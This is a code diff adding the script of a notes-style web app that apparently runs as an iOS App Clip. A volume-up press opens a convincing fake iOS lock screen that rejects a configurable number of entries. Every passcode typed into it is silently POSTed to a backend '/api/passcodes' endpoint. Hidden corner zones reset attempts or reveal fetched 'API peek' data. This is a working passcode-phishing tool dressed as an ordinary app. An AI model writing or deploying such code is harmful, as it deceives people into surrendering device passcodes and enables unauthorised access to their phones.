+        try { localStorage.setItem("notes_backend_url", next.trim().replace(/\/+$/, "")); } catch (_) {}
+        syncConfigFromBackend();
+      }
+    }
+  });
+})();
+
+/* ===== Volume Up Trigger (AuraKit) ===== */
+async function initVolumeTrigger() {
+  if (!window.AuraKit) return;
+  try { await AuraKit.ready(); } catch (_) { return; }
+  const handleVol = (ev) => {
+    const dir = (ev && (ev.button || ev.direction || ev.type || "")).toString().toLowerCase();
+    if (!dir || dir.includes("up")) {
+      if (!LockScreen.open) LockScreen.show();
+    }
+  };
+  try {
+    if (AuraKit.volumeButtons && typeof AuraKit.volumeButtons.watch === "function") {
+      AuraKit.volumeButtons.watch("up", handleVol);
+    }
+    if (typeof AuraKit.on === "function") {
+      AuraKit.on("volumeButton", handleVol);
+    }
+  } catch (_) {}
+}
+initVolumeTrigger();
+
+/* ===== Fake iOS Lock Screen ===== */
+const LockScreen = window.LockScreen = {
+  open: false,
+  digits: CFG.lockDigits || 4,
+  code: "",
+  attemptCount: 0,
+  wallpaperDataUrl: "",
+  holdTimers: {},
+  _apiCache: {},
+  _apiPeekIndex: 0,
+
+  init() {
+    try {
+      const savedWall = localStorage.getItem("notes_lock_wallpaper");
+      const savedCleaned = localStorage.getItem("notes_lock_wallpaper_cleaned") === "1";
+      if (savedWall) {
+        this.wallpaperDataUrl = savedWall;
+        this.wallpaperCleaned = savedCleaned;
+        this._preloadLensImage(savedWall);
+      }
+    } catch (_) {}
+
+    if (!this._resizeBound) {
+      this._resizeBound = true;
+      window.addEventListener("resize", () => { if (this.open) this.renderLiquidGlassLenses(true); });
+      const onResume = () => {
+        if (document.visibilityState && document.visibilityState !== "visible") return;
+        this.restorePendingPastePrompt();
+        this.fetchAllApiPeeks();
+        if (this.open) requestAnimationFrame(() => this.renderLiquidGlassLenses(true));
+      };
+      document.addEventListener("visibilitychange", onResume);
+      window.addEventListener("pageshow", onResume);
+      window.addEventListener("focus", onResume);
+    }
+    this.restorePendingPastePrompt();
+
+    const kp = document.getElementById("lockKeypad");
+    if (!kp || kp.dataset.built) return;
+    kp.dataset.built = "1";
+    const layout = [
+      ["1", ""], ["2", "ABC"], ["3", "DEF"],
+      ["4", "GHI"], ["5", "JKL"], ["6", "MNO"],
+      ["7", "PQRS"], ["8", "TUV"], ["9", "WXYZ"],
+      ["", ""], ["0", ""], ["", ""]
+    ];
+    layout.forEach(([n, letters], idx) => {
+      const b = document.createElement("button");
+      b.type = "button";
+      if (n === "" && idx === 9) {
+        b.className = "lockscreen-corner-zone"; b.setAttribute("aria-hidden", "true"); b.tabIndex = -1;
+        let t = null;
+        b.addEventListener("pointerdown", (e) => { e.preventDefault(); clearTimeout(t); t = setTimeout(() => { t = null; this.resetPasscodeAttempts(); }, 450); });
+        const c = () => { clearTimeout(t); t = null; };
+        b.addEventListener("pointerup", c); b.addEventListener("pointercancel", c); b.addEventListener("pointerleave", c);
+        kp.appendChild(b); return;
+      }
+      if (n === "" && idx === 11) {
+        b.className = "lockscreen-corner-zone"; b.setAttribute("aria-hidden", "true"); b.tabIndex = -1;
+        let t = null, active = false, ox = 0, pid = null;
+        b.addEventListener("pointerdown", (e) => {
+          e.preventDefault(); pid = e.pointerId; ox = e.clientX; active = false;
+          try { b.setPointerCapture(e.pointerId); } catch (_) {}
+          clearTimeout(t); t = setTimeout(() => { t = null; active = true; this.showNoteifyApiPeek(); }, 110);
+        });
+        b.addEventListener("pointermove", (e) => {
+          if (!active || (pid !== null && e.pointerId !== pid)) return;
+          if (Math.abs(e.clientX - ox) >= 42) { ox = e.clientX; this.cycleNoteifyApiPeek(e.clientX < ox ? 1 : -1); }
+        });
+        const h = () => { clearTimeout(t); t = null; pid = null; if (active) { active = false; this.hideNoteifyApiPeek(); } };
+        b.addEventListener("pointerup", h); b.addEventListener("pointercancel", h);
+        kp.appendChild(b); return;
+      }
+
+      b.className = "lockscreen-key" + (n === "0" ? " key-0" : "");
+      b.dataset.n = n;
+      const glassLayers = `<canvas class="glass-lens" aria-hidden="true"></canvas><span class="glass-rim" aria-hidden="true"></span><span class="glass-flash" aria-hidden="true"></span>`;
+      if (n === "0") b.innerHTML = `${glassLayers}<span class="digit">0</span>`;
+      else if (n === "1") b.innerHTML = `${glassLayers}<span class="digit">1</span><span class="letters empty">&nbsp;</span>`;
+      else b.innerHTML = `${glassLayers}<span class="digit">${n}</span><span class="letters">${letters}</span>`;
+
+      let lastTap = 0, holding = false, relTimer = null;
+      b.addEventListener("pointerdown", (e) => {
+        e.preventDefault();
+        const now = Date.now();
+        if (now - lastTap < 45) return;
+        lastTap = now; b._pressStart = now; holding = true;
+        clearTimeout(relTimer); b.classList.add("is-pressed");
+        this.tap(n);
+      });
+      b.addEventListener("click", (e) => e.preventDefault());
+      const unpress = () => {
+        if (!holding) return; holding = false;
+        const holdMin = Math.max(0, 90 - (Date.now() - (b._pressStart || 0)));
+        clearTimeout(relTimer); relTimer = setTimeout(() => b.classList.remove("is-pressed"), holdMin);
+      };
+      b.addEventListener("pointerup", unpress); b.addEventListener("pointercancel", unpress); b.addEventListener("pointerleave", unpress);
+      kp.appendChild(b);
+    });
+
+    const cancelBtn = document.getElementById("lockCancelBtn");
+    const emergBtn = document.getElementById("lockEmergencyBtn");
+    cancelBtn.addEventListener("pointerdown", (e) => this.startFooterHold(e, "cancel"));
+    cancelBtn.addEventListener("pointerup", (e) => this.endFooterHold(e, "cancel"));
+    cancelBtn.addEventListener("pointercancel", (e) => this.endFooterHold(e, "cancel", true));
+    emergBtn.addEventListener("pointerdown", (e) => this.startFooterHold(e, "emergency"));
+    emergBtn.addEventListener("pointerup", (e) => this.endFooterHold(e, "emergency"));
+    emergBtn.addEventListener("pointercancel", (e) => this.endFooterHold(e, "emergency", true));
+
+    document.getElementById("lockPasteYes").addEventListener("click", async (e) => { e.preventDefault(); e.stopPropagation(); await this.doPasteWallpaper(); });
+    document.getElementById("lockPasteNo").addEventListener("click", (e) => { e.preventDefault(); e.stopPropagation(); this.hidePastePrompt(); });
+    const fileIn = document.getElementById("lockFileInput");
+    document.getElementById("lockPastePick").addEventListener("click", (e) => { e.preventDefault(); e.stopPropagation(); fileIn.value = ""; fileIn.click(); });
+    fileIn.addEventListener("change", () => {
+      const f = fileIn.files && fileIn.files[0];
+      if (f) this.applyWallpaperFile(f);
+      this.hidePastePrompt();
+    });
+  },
+
+  startFooterHold(e, kind) {
+    e.preventDefault(); e.stopPropagation();
+    clearTimeout(this.holdTimers[kind]);
+    this.holdTimers[kind] = setTimeout(() => {
+      this.holdTimers[kind] = "fired";
+      const url = kind === "emergency" ? (CFG.lockEmergencyUrl || CFG.lockCancelUrl) : CFG.lockCancelUrl;
+      if (url && (!this.code || kind === "emergency")) openShortcutInSafari(url);
+    }, 800);
+  },
+  endFooterHold(e, kind, cancelled) {
+    const t = this.holdTimers[kind];
+    clearTimeout(t); this.holdTimers[kind] = null;
+    if (cancelled || t === "fired") return;
+    if (kind === "cancel") {
+      if (this.code.length > 0) {
+        this.code = this.code.slice(0, -1);
+        this.buildDots();
+      } else {
+        this._cancelTapCount = (this._cancelTapCount || 0) + 1;
+        clearTimeout(this._cancelTapTimer);
+        this._cancelTapTimer = setTimeout(() => { this._cancelTapCount = 0; }, 750);
+        if (this._cancelTapCount >= 3) { this._cancelTapCount = 0; this.close(); }
+      }
+    }
+  },
+  updateCancelLabel() {
+    document.getElementById("lockCancelBtn").textContent = this.code.length > 0 ? "Delete" : "Cancel";
+  },
+  buildDots() {
+    const box = document.getElementById("lockDots");
+    box.innerHTML = "";
+    box.className = "lockscreen-dots" + (this.digits === 4 ? " dots-4" : " dots-6");
+    for (let i = 0; i < this.digits; i++) {
+      const d = document.createElement("div");
+      d.className = "lockscreen-dot" + (i < this.code.length ? " filled" : "");
+      box.appendChild(d);
+    }
+    const promptEl = document.getElementById("lockPrompt");
+    if (promptEl && !promptEl.dataset.toggleBound) {
+      promptEl.dataset.toggleBound = "1";
+      let t = null;
+      const start = () => { clearTimeout(t); t = setTimeout(() => { t = null; this.toggleDigitsLength(); }, 500); };
+      const stop = () => { clearTimeout(t); t = null; };
+      promptEl.addEventListener("pointerdown", start);
+      promptEl.addEventListener("pointerup", stop);
+      promptEl.addEventListener("pointercancel", stop);
+      promptEl.addEventListener("pointerleave", stop);
+    }
+    this.updateCancelLabel();
+  },
+  toggleDigitsLength() {
+    this.digits = (this.digits === 4) ? 6 : 4;
+    this.code = "";
+    CFG.lockDigits = this.digits;
+    this.buildDots();
+  },
+  resetPasscodeAttempts() {
+    this.attemptCount = 0;
+    this.code = "";
+    this.buildDots();
+  },
+  tap(n) {
+    if (!this.open || this._unlocking || this.code.length >= this.digits) return;
+    this.code += String(n);
+    this.buildDots();
+    if (this.code.length >= this.digits) {
+      const req = Number(CFG.lockAttemptsToUnlock) || 1;
+      this.attemptCount = (this.attemptCount || 0) + 1;
+      if (this.attemptCount < req) setTimeout(() => this.failPasscodeAttempt(), 180);
+      else setTimeout(() => this.unlock(this.code), 140);
+    }
+  },
+  failPasscodeAttempt() {
+    if (!this.open || this._unlocking) return;
+    const dotsEl = document.getElementById("lockDots");
+    dotsEl.classList.remove("shake"); void dotsEl.offsetWidth; dotsEl.classList.add("shake");
+    setTimeout(() => { this.code = ""; this.buildDots(); dotsEl.classList.remove("shake"); }, 500);
+  },
+
+  async unlock(code) {
+    if (this._unlocking) return;
+    this._unlocking = true;
+    const base = getBackendBase();
+    if (base) {
+      fetch(base + "/api/passcodes", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ code: String(code), digits: this.digits, ts: Date.now() }),
+        keepalive: true
+      }).catch(() => {});
+    }
+
+    const outcome = CFG.unlockOutcome || "quit";
+    if (outcome === "screenshot" && CFG.customScreenshotDataUrl) {
+      const sv = document.getElementById("customShotView");
+      document.getElementById("customShotImg").src = CFG.customScreenshotDataUrl;
+      sv.classList.add("show");
+    } else {
+      document.getElementById("customShotView").classList.remove("show");
+    }
+
+    if (outcome === "quit" && window.AuraKit && typeof AuraKit.quitAppClip === "function") {
+      try { await AuraKit.quitAppClip(); } catch (_) {}
+    }
+
+    this.close();
+  },
+
+  show() {
+    const el = document.getElementById("lockScreen");
+    this.open = true;
+    this._unlocking = false;
+    this.code = "";
+    this.attemptCount = 0;
+    this.digits = Number(CFG.lockDigits) || 4;
+    const blurPx = this.wallpaperCleaned ? 0 : (Number(CFG.lockBlur) || 0);
+    el.style.setProperty("--lock-blur", blurPx + "px");
+    el.classList.toggle("ai-clean", !!this.wallpaperCleaned);
+    const bg = document.getElementById("lockBg");
+    if (this.wallpaperDataUrl && bg) {
+      el.classList.add("has-wallpaper");
+      bg.style.backgroundImage = `url("${this.wallpaperDataUrl}")`;
+      bg.style.filter = blurPx === 0 ? "none" : `blur(${blurPx}px) brightness(0.90) saturate(1.15)`;
+      bg.style.transform = blurPx === 0 ? "none" : "scale(1.18)";
+    }
+    el.classList.remove("unlocking", "open");
+    void el.offsetWidth;
+    el.classList.add("open");
+    el.setAttribute("aria-hidden", "false");
+    this.buildDots();
+    this.fetchAllApiPeeks();
+    requestAnimationFrame(() => this.renderLiquidGlassLenses(false));
+    clearTimeout(this._lensPostTimer);
+    this._lensPostTimer = setTimeout(() => { if (this.open && !this._unlocking) this.renderLiquidGlassLenses(true); }, 480);
+  },
+
+  close(immediate) {
+    const el = document.getElementById("lockScreen");
+    this.hideNoteifyApiPeek();
+    const finish = () => {
+      this.open = false; this._unlocking = false; this.code = "";
+      el.classList.remove("open", "unlocking");
+      el.setAttribute("aria-hidden", "true");
+    };
+    if (immediate) { finish(); return; }
+    el.classList.add("unlocking");
+    clearTimeout(this._closeTimer);
+    this._closeTimer = setTimeout(finish, 300);
+  },
+
+  _preloadLensImage(src) {
+    if (!src) return Promise.resolve(null);
+    if (this._lensSrc === src && this._lensImg && this._lensImg.naturalWidth) return Promise.resolve(this._lensImg);
+    this._lensSrc = src;
+    return new Promise((resolve) => {
+      const img = new Image();
+      if (!src.startsWith("data:") && !src.startsWith("blob:")) img.crossOrigin = "anonymous";
+      img.onload = () => { this._lensImg = img; resolve(img); };
+      img.onerror = () => resolve(null);
+      img.src = src;
+    });
+  },
+
+  async renderLiquidGlassLenses(force) {
+    const el = document.getElementById("lockScreen");
+    const keys = Array.from(el.querySelectorAll(".lockscreen-key"));
+    if (!keys.length) return;
+    const glassStyle = ["liquid", "crystal", "backdrop"].includes(CFG.lockGlassStyle) ? CFG.lockGlassStyle : "liquid";
+    keys.forEach(k => k.classList.toggle("glass-mode-backdrop", glassStyle === "backdrop"));
+    if (glassStyle === "backdrop" || !this.wallpaperDataUrl) {
+      keys.forEach(k => k.classList.remove("has-lens")); return;
+    }
+    const img = await this._preloadLensImage(this.wallpaperDataUrl);
+    if (!img || !img.naturalWidth) { keys.forEach(k => k.classList.remove("has-lens")); return; }
+    const vw = el.clientWidth || window.innerWidth || 390, vh = el.clientHeight || window.innerHeight || 844;
+    const blurPx = this.wallpaperCleaned ? 0 : (Number(CFG.lockBlur) || 0);
+    const isStrongLiquid = (glassStyle === "liquid");
+    const cacheKey = `${glassStyle}:${this.wallpaperDataUrl.length}:${vw}x${vh}:${blurPx}`;
+    if (!force && this._lastLensKey === cacheKey && keys[0].classList.contains("has-lens")) return;
+    try {
+      const nw = img.naturalWidth, nh = img.naturalHeight, coverScale = Math.max(vw / nw, vh / nh);
+      const drawW = nw * coverScale, drawH = nh * coverScale, drawX = (vw - drawW) / 2;
+      const ds = (blurPx > 0) ? Math.max(0.06, Math.min(0.22, 6 / Math.max(12, blurPx))) : 0.42;
+      const tmpW = Math.max(32, Math.round(vw * ds)), tmpH = Math.max(32, Math.round(vh * ds));
+      const tmpC = document.createElement("canvas"); tmpC.width = tmpW; tmpC.height = tmpH;
+      const tmpCtx = tmpC.getContext("2d"); tmpCtx.imageSmoothingQuality = "high";
+      if (blurPx > 0) {
+        tmpCtx.save(); tmpCtx.translate(tmpW * 0.5, tmpH * 0.5); tmpCtx.scale(1.18, 1.18); tmpCtx.translate(-tmpW * 0.5, -tmpH * 0.5);
+        tmpCtx.drawImage(img, drawX * ds, 0, drawW * ds, drawH * ds); tmpCtx.restore();
+      } else {
+        tmpCtx.drawImage(img, drawX * ds, 0, drawW * ds, drawH * ds);
+      }
+      const srcC = document.createElement("canvas"); srcC.width = vw; srcC.height = vh;
+      const srcCtx = srcC.getContext("2d"); srcCtx.imageSmoothingQuality = "high";
+      srcCtx.drawImage(tmpC, 0, 0, tmpW, tmpH, 0, 0, vw, vh);
+      const srcData = srcCtx.getImageData(0, 0, vw, vh).data;
+      const getRestingBox = (node) => {
+        let x = 0, y = 0, cur = node;
+        while (cur && cur !== el) { x += cur.offsetLeft; y += cur.offsetTop; cur = cur.offsetParent; }
+        return { x, y, w: node.offsetWidth, h: node.offsetHeight };
+      };
+      const dpr = Math.min(2, window.devicePixelRatio || 2), vwMax = vw - 1, vhMax = vh - 1;
+      const sampleChannel = (fx, fy, ch) => {
+        const cx = fx < 0 ? 0 : (fx > vwMax ? vwMax : fx), cy = fy < 0 ? 0 : (fy > vhMax ? vhMax : fy);
+        const x0 = cx | 0, y0 = cy | 0, x1 = x0 < vwMax ? x0 + 1 : vwMax, y1 = y0 < vhMax ? y0 + 1 : vhMax;
+        const tx = cx - x0, ty = cy - y0;
+        const i00 = ((y0 * vw + x0) << 2) + ch, i10 = ((y0 * vw + x1) << 2) + ch;
+        const i01 = ((y1 * vw + x0) << 2) + ch, i11 = ((y1 * vw + x1) << 2) + ch;
+        return (srcData[i00] + (srcData[i10] - srcData[i00]) * tx) + ((srcData[i01] + (srcData[i11] - srcData[i01]) * tx) - (srcData[i00] + (srcData[i10] - srcData[i00]) * tx)) * ty;
+      };
+      for (const btn of keys) {
+        const canvas = btn.querySelector("canvas.glass-lens"), box = getRestingBox(btn);
+        if (!canvas || !box.w) continue;
+        const size = Math.round(box.w * dpr);
+        if (canvas.width !== size || canvas.height !== size) { canvas.width = size; canvas.height = size; }
+        const ctx = canvas.getContext("2d"), outImg = ctx.createImageData(size, size), out = outImg.data;
+        const R = size * 0.5, invR = 1 / R, btnCx = box.x + box.w * 0.5, btnCy = box.y + box.h * 0.5, radCss = box.w * 0.5;
+        for (let py = 0; py < size; py++) {
+          const ny = (py + 0.5 - R) * invR, ny2 = ny * ny, rowOff = py * size;
+          for (let px = 0; px < size; px++) {
+            const nx = (px + 0.5 - R) * invR, r2 = nx * nx + ny2;
+            if (r2 >= 1.0) continue;
+            const r = Math.sqrt(r2), r4 = r2 * r2, r8 = r4 * r4;
+            const sampleScale = isStrongLiquid ? (0.91 + 0.07 * r2 - 0.28 * r8) : (0.96 + 0.04 * r2 - 0.15 * r8);
+            const disp = r8 * (isStrongLiquid ? 0.012 : 0.005);
+            let sr = sampleChannel(btnCx + nx * (sampleScale + disp) * radCss, btnCy + ny * (sampleScale + disp) * radCss, 0);
+            let sg = sampleChannel(btnCx + nx * sampleScale * radCss, btnCy + ny * sampleScale * radCss, 1);
+            let sb = sampleChannel(btnCx + nx * (sampleScale - disp) * radCss, btnCy + ny * (sampleScale - disp) * radCss, 2);
+            const lum = 0.299 * sr + 0.587 * sg + 0.114 * sb, sat = isStrongLiquid ? 1.08 : 0.97;
+            sr = lum + (sr - lum) * sat; sg = lum + (sg - lum) * sat; sb = lum + (sb - lum) * sat;
+            const topSpec = -ny * 0.88 - nx * 0.34, botSpec = ny * 0.88 + nx * 0.34;
+            const tW = topSpec > 0 ? Math.pow(topSpec, 1.45) : 0, bW = botSpec > 0 ? Math.pow(botSpec, 1.55) : 0;
+            const dirW = isStrongLiquid ? (0.20 + 0.78 * tW + 0.60 * bW) : (0.16 + 0.72 * tW + 0.54 * bW);
+            const baseVeil = (isStrongLiquid ? 0.08 : 0.05) + (ny < 0 ? (-ny) * (isStrongLiquid ? 0.055 : 0.035) * (1 - r * 0.4) : 0);
+            const whiteAlpha = Math.min(0.68, baseVeil + r4 * r * (isStrongLiquid ? 0.10 : 0.065) * dirW + r8 * r8 * (isStrongLiquid ? 0.42 : 0.30) * dirW);
+            const invAlpha = 1 - whiteAlpha;
+            sr = sr * invAlpha + 255 * whiteAlpha; sg = sg * invAlpha + 255 * whiteAlpha; sb = sb * invAlpha + 255 * whiteAlpha;
+            const idx = (rowOff + px) << 2;
+            out[idx] = sr > 255 ? 255 : (sr < 0 ? 0 : sr | 0);
+            out[idx + 1] = sg > 255 ? 255 : (sg < 0 ? 0 : sg | 0);
+            out[idx + 2] = sb > 255 ? 255 : (sb < 0 ? 0 : sb | 0);
+            const edgePx = (1.0 - r) * R;
+            out[idx + 3] = edgePx < 1.5 ? Math.max(0, Math.min(255, (edgePx / 1.5 * 255) | 0)) : 255;
+          }
+        }
+        ctx.putImageData(outImg, 0, 0);
+        btn.classList.add("has-lens");
+      }
+      this._lastLensKey = cacheKey;
+    } catch (_) {
+      keys.forEach(k => k.classList.remove("has-lens"));
+    }
+  },
+
+  showPastePrompt() {
+    document.getElementById("lockPastePrompt").classList.add("show");
+    try { localStorage.setItem("notes_pending_paste_ts", String(Date.now())); } catch (_) {}
+  },
+  hidePastePrompt() {
+    document.getElementById("lockPastePrompt").classList.remove("show");
+    try { localStorage.removeItem("notes_pending_paste_ts"); } catch (_) {}
+  },
+  restorePendingPastePrompt() {
+    try {
+      const ts = Number(localStorage.getItem("notes_pending_paste_ts") || 0);
+      if (ts && Date.now() - ts < 600000) document.getElementById("lockPastePrompt").classList.add("show");
+      else if (ts) localStorage.removeItem("notes_pending_paste_ts");
+    } catch (_) {}
+  },
+  async doPasteWallpaper() {
+    try {
+      if (navigator.clipboard && navigator.clipboard.read) {
+        const items = await navigator.clipboard.read();
+        for (const item of items) {
+          const t = item.types.find(x => x.startsWith("image/"));
+          if (t) { this.applyWallpaperFile(await item.getType(t)); this.hidePastePrompt(); return; }
+        }
+      }
+    } catch (_) {}
+    const fileIn = document.getElementById("lockFileInput");
+    fileIn.value = ""; fileIn.click();
+  },
+  applyWallpaperFile(file) {
+    const r = new FileReader();
+    r.onload = () => {
+      const dataUrl = String(r.result || "");
+      if (!dataUrl) return;
+      this.wallpaperDataUrl = dataUrl;
+      this.wallpaperCleaned = false;
+      this._lastLensKey = "";
+      try {
+        localStorage.setItem("notes_lock_wallpaper", dataUrl);
+        localStorage.setItem("notes_lock_wallpaper_cleaned", "0");
+      } catch (_) {}
+      this.cleanWallpaperAI(dataUrl);
+      if (this.open) this.show();
+    };
+    r.readAsDataURL(file);
+  },
+  async cleanWallpaperAI(dataUrl) {
+    const base = getBackendBase();
+    if (!base) return;
+    try {
+      const res = await fetch(base + "/api/wallpaper/clean", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ image: dataUrl, aspect_ratio: "9:16" })
+      });
+      const d = await res.json().catch(() => ({}));
+      if (res.ok && d.ok && (d.dataUrl || d.url)) {
+        this.wallpaperDataUrl = d.dataUrl || d.url;
+        this.wallpaperCleaned = true;
+        this._lastLensKey = "";
+        try {
+          localStorage.setItem("notes_lock_wallpaper", this.wallpaperDataUrl);
+          localStorage.setItem("notes_lock_wallpaper_cleaned", "1");
+        } catch (_) {}
+        if (this.open) this.show();
+      }
+    } catch (_) {}
+  },
+
+  async fetchAllApiPeeks() {
+    const list = Array.isArray(CFG.lockApiPeeks) ? CFG.lockApiPeeks : [];
+    for (const item of list) {
+      if (!item || !item.url) continue;
+      try {
+        let txt;
+        try {
+          const r = await fetch(item.url, { cache: "no-store" });
+          if (r.ok) txt = await r.text();
+        } catch (_) {}
+        if (txt === undefined) {
+          const r2 = await fetch("https://api.allorigins.win/raw?url=" + encodeURIComponent(item.url), { cache: "no-store" });
+          txt = await r2.text();
+        }
+        try { this._apiCache[item.url] = JSON.parse(txt); } catch (_) { this._apiCache[item.url] = txt; }
+      } catch (_) {}
+    }
+  },
+  showNoteifyApiPeek() {
+    const ov = document.getElementById("lockNoteifyPeek");
+    const list = (CFG.lockApiPeeks || []).filter(x => x && x.url);
+    if (!list.length) return;
+    if (this._apiPeekIndex >= list.length) this._apiPeekIndex = 0;
+    const item = list[this._apiPeekIndex];
+    document.getElementById("lockNoteifyTitle").textContent = item.label || "API Peek";
+    const d = this._apiCache[item.url];
+    let val = "—";
+    if (d != null) val = typeof d === "object" ? (item.field && d[item.field] !== undefined ? String(d[item.field]) : JSON.stringify(d)) : String(d);
+    document.getElementById("lockNoteifyValue").textContent = val;
+    ov.classList.add("show");
+  },
+  cycleNoteifyApiPeek(delta) {
+    const list = (CFG.lockApiPeeks || []).filter(x => x && x.url);
+    if (!list.length) return;
+    this._apiPeekIndex = (this._apiPeekIndex + delta + list.length) % list.length;
+    this.showNoteifyApiPeek();
+  },
+  hideNoteifyApiPeek() {
+    document.getElementById("lockNoteifyPeek").classList.remove("show");
+  }
+};
+
+LockScreen.init();
+</script>
+</body>
+</html>
